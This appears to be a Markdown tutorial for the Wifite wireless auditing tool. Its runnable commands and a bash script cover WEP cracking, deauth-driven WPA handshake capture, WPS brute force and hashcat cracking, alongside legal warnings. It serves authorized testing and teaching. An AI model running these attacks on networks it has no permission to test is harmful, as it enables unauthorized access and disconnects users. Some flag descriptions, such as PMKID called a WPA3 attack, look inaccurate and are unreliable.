# Wifite

## Introduction

## What is Wifite?

Wifite is an automated wireless network auditing tool designed to attack multiple wireless networks encrypted with WEP, WPA, and WPS. It automates the process of attacking WiFi networks, making wireless security testing more accessible while requiring minimal user interaction.

## Why Wifite?

- Automated wireless network attacks
- Supports WEP, WPA/WPA2, and WPS attacks
- Minimal user interaction required
- Customizable attack strategies
- Integrates with multiple wireless tools
- Cross-platform (Linux-based)
- Active development (Wifite2)

## Learning Path

1. Understand wireless security fundamentals
2. Learn about WEP, WPA/WPA2, WPS protocols
3. Set up compatible wireless adapter
4. Practice in isolated test environment
5. Master automated attack workflows

## User Guide

## Prerequisites

- Linux system (Kali Linux recommended)
- Wireless adapter with monitor mode support
- Root/sudo privileges
- Required tools (aircrack-ng suite, reaver, etc.)
- **Legal authorization** for wireless testing

Check if wifite is installed:

```bash
wifite --help
```

## Installation

### Kali Linux

```bash
# Usually pre-installed as wifite
# Or install Wifite2 (recommended)
sudo apt update
sudo apt install wifite
```

### Ubuntu/Debian

```bash
# Install Wifite2
sudo apt update
sudo apt install wifite

# Or from GitHub
git clone https://github.com/derv82/wifite2.git
cd wifite2
sudo python3 setup.py install
```

### From GitHub (Latest)

```bash
# Clone repository
git clone https://github.com/derv82/wifite2.git
cd wifite2

# Install dependencies
sudo apt install aircrack-ng reaver tshark macchanger

# Install Wifite
sudo python3 setup.py install

# Or run directly
sudo ./Wifite.py
```

### Install Dependencies

```bash
# Essential tools
sudo apt install aircrack-ng

# For WPS attacks
sudo apt install reaver pixiewps

# For handshake capture
sudo apt install tshark

# Optional tools
sudo apt install macchanger
sudo apt install hashcat
sudo apt install pyrit
sudo apt install cowpatty
```

## Basic Usage

### Simple automated attack

```bash
# Run Wifite with default settings
sudo wifite

# Wifite will:
# 1. Enable monitor mode
# 2. Scan for networks
# 3. Let you select targets
# 4. Automatically attack selected networks
```

### Scan only mode

```bash
# Scan and display networks without attacking
sudo wifite --no-attack
```

### Attack specific network

```bash
# Filter by ESSID
sudo wifite --essid "TargetNetwork"

# Filter by BSSID
sudo wifite --bssid AA:BB:CC:DD:EE:FF
```

## Command-Line Options

### Network filtering

```bash
# Filter by encryption type
sudo wifite --wep              # Only WEP networks
sudo wifite --wpa              # Only WPA networks
sudo wifite --wps              # Only WPS-enabled networks

# Filter by signal strength
sudo wifite --power 50         # Only networks with signal > 50dB

# Filter by channel
sudo wifite --channel 6        # Only channel 6
sudo wifite --channel 1,6,11   # Multiple channels
```

### Attack configuration

```bash
# Number of deauth packets
sudo wifite --deauth-count 10

# Dictionary for WPA attacks
sudo wifite --dict /path/to/wordlist.txt

# Crack handshakes with hashcat
sudo wifite --hashcat

# Use aircrack-ng for cracking
sudo wifite --aircrack
```

### Interface configuration

```bash
# Specify interface
sudo wifite --interface wlan0

# Don't check for monitor mode
sudo wifite --no-monmode

# Keep monitor mode after exit
sudo wifite --keep-monmode
```

## WEP Attacks

### Automated WEP cracking

```bash
# Attack WEP networks only
sudo wifite --wep

# Custom WEP timeout
sudo wifite --wep-timeout 600

# Minimum IVs before cracking
sudo wifite --wep-pps 300
```

### WEP attack process

```
1. Enable monitor mode
2. Discover WEP networks
3. Capture packets (IVs)
4. Inject packets to speed up capture
5. Crack key when enough IVs collected
```

## WPA/WPA2 Attacks

### Handshake capture

```bash
# Attack WPA networks
sudo wifite --wpa

# Custom deauth count
sudo wifite --wpa-deauth 20

# Strip PMKID (WPA3 attack)
sudo wifite --pmkid

# Timeout for handshake capture
sudo wifite --wpa-attack-timeout 500
```

### Dictionary attack

```bash
# Use custom wordlist
sudo wifite --dict /usr/share/wordlists/rockyou.txt

# Use multiple wordlists
sudo wifite --dict wordlist1.txt,wordlist2.txt

# Specify cracking tool
sudo wifite --aircrack       # Use aircrack-ng
sudo wifite --hashcat        # Use hashcat
sudo wifite --john           # Use John the Ripper
```

### WPA attack process

```
1. Enable monitor mode
2. Discover WPA networks
3. Send deauth packets to clients
4. Capture 4-way handshake
5. Crack handshake with dictionary
```

## WPS Attacks

### Automated WPS attacks

```bash
# Attack WPS-enabled networks only
sudo wifite --wps-only

# Disable Pixie Dust attack
sudo wifite --no-pixie

# Disable PIN bruteforce
sudo wifite --no-wps
```

### WPS attack methods

```bash
# Pixie Dust attack (fast)
# Exploits weak random number generation

# PIN attack (slow)
# Brute forces 8-digit WPS PIN

# WPS attack timeout
sudo wifite --wps-timeout 660
```

### WPS attack process

```
1. Identify WPS-enabled networks
2. Attempt Pixie Dust attack first
3. If failed, try PIN bruteforce
4. Extract WPA password from WPS PIN
```

## Advanced Options

### MAC address spoofing

```bash
# Change MAC address
sudo wifite --mac

# Change to specific MAC
sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0
sudo wifite --interface wlan0
```

### Output and logging

```bash
# Verbose output
sudo wifite --verbose

# Save output to file
sudo wifite 2>&1 | tee wifite_log.txt

# Save cracked passwords
# Automatically saved to cracked.txt
```

### Kill conflicting processes

```bash
# Automatically kill NetworkManager, etc.
sudo wifite --kill

# Or manually
sudo airmon-ng check kill
```

## Customization

### Attack timeout

```bash
# WEP attack timeout (seconds)
sudo wifite --wep-timeout 600

# WPA attack timeout (seconds)
sudo wifite --wpa-attack-timeout 500

# WPS attack timeout (seconds)
sudo wifite --wps-timeout 660
```

### Number of targets

```bash
# Attack multiple targets
sudo wifite --num-targets 5

# Attack all targets
sudo wifite --infinite
```

### Crack configuration

```bash
# Skip cracking (capture only)
sudo wifite --skip-crack

# Use specific cracker
sudo wifite --aircrack
sudo wifite --hashcat
sudo wifite --pyrit
```

## Common Use Cases

### Quick audit of home network

```bash
# Test your own network
sudo wifite --essid "MyNetwork" --wpa --dict /usr/share/wordlists/rockyou.txt

# Check if:
# - WPS is disabled
# - Password is strong
# - Handshake can be captured
```

### Test WPS vulnerabilities

```bash
# Scan for WPS-enabled networks
sudo wifite --wps-only

# Attempt Pixie Dust attack
# Very fast if vulnerable
```

### Capture handshakes for offline cracking

```bash
# Capture handshakes only
sudo wifite --wpa --skip-crack

# Handshakes saved to hs/ directory
# Crack later with hashcat or aircrack-ng
```

### Comprehensive network audit

```bash
# Scan all network types
sudo wifite --kill

# Attack:
# - WEP networks (if any)
# - WPS-enabled networks
# - WPA networks with dictionary
```

## Offline Handshake Cracking

### Using captured handshakes

```bash
# Handshakes saved in hs/ directory
ls hs/

# Crack with aircrack-ng
aircrack-ng -w wordlist.txt hs/handshake.cap

# Crack with hashcat
# Convert to hashcat format first
sudo wifite --crack --dict wordlist.txt
```

### Hashcat cracking

```bash
# Convert handshake
cap2hccapx handshake.cap handshake.hccapx

# Crack with hashcat
hashcat -m 2500 handshake.hccapx wordlist.txt

# Or use GPU
hashcat -m 2500 handshake.hccapx wordlist.txt -w 3 -O
```

## Scripting and Automation

### Automated attack script

```bash
#!/bin/bash
# Automated Wifite attack script

INTERFACE="wlan0"
WORDLIST="/usr/share/wordlists/rockyou.txt"
ESSID="TargetNetwork"

echo "[*] Starting automated attack on $ESSID"

# Kill conflicting processes
sudo airmon-ng check kill

# Run Wifite
sudo wifite \
    --interface $INTERFACE \
    --essid "$ESSID" \
    --wpa \
    --dict $WORDLIST \
    --verbose

echo "[*] Attack complete. Check cracked.txt for results"
```

### Scheduled scanning

```bash
#!/bin/bash
# Regular wireless network scanning

LOGDIR="/var/log/wifite"
mkdir -p $LOGDIR

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOGFILE="$LOGDIR/scan_${TIMESTAMP}.log"

echo "[*] Starting network scan at $(date)" | tee $LOGFILE

sudo wifite \
    --no-attack \
    --verbose 2>&1 | tee -a $LOGFILE

echo "[*] Scan complete" | tee -a $LOGFILE
```

### Monitor for new networks

```bash
#!/bin/bash
# Continuous monitoring for new networks

while true; do
    echo "[$(date)] Scanning for networks..."
    sudo wifite --no-attack > /tmp/current_scan.txt 2>&1
    
    # Compare with previous scan
    if [ -f /tmp/previous_scan.txt ]; then
        diff /tmp/previous_scan.txt /tmp/current_scan.txt | grep ">" | \
            mail -s "New WiFi Networks Detected" admin@example.com
    fi
    
    mv /tmp/current_scan.txt /tmp/previous_scan.txt
    sleep 3600  # Scan every hour
done
```

## Troubleshooting

### Wireless adapter not detected

```bash
# Check if adapter supports monitor mode
sudo airmon-ng

# Start monitor mode manually
sudo airmon-ng start wlan0

# Then run Wifite
sudo wifite --interface wlan0mon
```

### No networks found

```bash
# Check if in monitor mode
iwconfig

# Verify channels
sudo wifite --channel 1,6,11

# Try different interface
sudo wifite --interface wlan1
```

### Handshake capture fails

```bash
# Increase deauth packets
sudo wifite --wpa-deauth 50

# Increase timeout
sudo wifite --wpa-attack-timeout 1000

# Try different channel
sudo wifite --channel 6
```

### Tools not found

```bash
# Install missing dependencies
sudo apt install aircrack-ng reaver tshark

# Check tool availability
which aircrack-ng
which reaver
which tshark
```

### Permission errors

```bash
# Always run as root
sudo wifite

# Check interface permissions
ls -l /sys/class/net/wlan0
```

## Security and Legal Considerations

### ⚠️ Legal Warning

- **Only test wireless networks you own or have explicit written authorization to test**
- Unauthorized wireless network access is a **serious crime**
- Violating computer fraud and wireless communication laws can result in imprisonment
- Possession of tools without lawful purpose may be illegal in some jurisdictions
- Always obtain proper authorization before conducting wireless security assessments

### Ethical usage

```bash
# Legitimate uses only:
# - Testing your own wireless network
# - Authorized penetration testing with written consent
# - Security research in isolated lab environment
# - Educational purposes in controlled settings

# Best practices:
# - Document all authorization in writing
# - Clearly define scope and limitations
# - Avoid disrupting network availability
# - Use responsible disclosure for vulnerabilities
# - Follow all applicable laws and regulations
# - Never use for unauthorized access
```

## Quick Reference

### Essential commands

```bash
# Basic attack
sudo wifite

# WPA attack with dictionary
sudo wifite --wpa --dict wordlist.txt

# WPS attack only
sudo wifite --wps-only

# Target specific network
sudo wifite --essid "NetworkName"

# Scan only
sudo wifite --no-attack

# Specify interface
sudo wifite --interface wlan0
```

### Common options

```bash
--wep                # Attack WEP only
--wpa                # Attack WPA only
--wps                # Attack WPS only
--essid <name>       # Target specific ESSID
--bssid <addr>       # Target specific BSSID
--channel <ch>       # Specific channel(s)
--power <db>         # Minimum signal strength
--dict <file>        # Password dictionary
--no-attack          # Scan only
--verbose            # Detailed output
```

## Real-World Examples

### Audit corporate WiFi security

```bash
# With written authorization
sudo wifite \
    --essid "CorporateNet" \
    --wpa \
    --dict /path/to/corporate_wordlist.txt \
    --verbose

# Test for:
# - Password strength
# - WPS vulnerabilities
# - Handshake capture ease
```

### Test guest network isolation

```bash
# Capture handshake from guest network
sudo wifite --essid "GuestWiFi" --wpa --skip-crack

# Attempt to crack
# Verify strong password policy
```

### Verify WPS disabled

```bash
# Scan for WPS
sudo wifite --wps-only --no-attack

# Should show no WPS-enabled networks
# If found, disable WPS on affected APs
```

## Resources

- [Wifite2 GitHub](https://github.com/derv82/wifite2)
- [Original Wifite](https://github.com/derv82/wifite)
- [Aircrack-ng](https://www.aircrack-ng.org/)
- [Reaver](https://github.com/t6x/reaver-wps-fork-t6x)
- [WiFi Security](https://www.wi-fi.org/discover-wi-fi/security)

## Next Steps

- Learn individual tools (aircrack-ng, reaver, hashcat)
- Study wireless protocols in depth (802.11, WPA2, WPA3)
- Practice in isolated lab environment
- Set up wireless security lab with test APs
- Learn about wireless intrusion detection
- Study advanced WiFi security (WPA3, KRACK, etc.)
- Obtain wireless security certifications (OSWP)
- Explore enterprise WiFi security (802.1X, RADIUS)
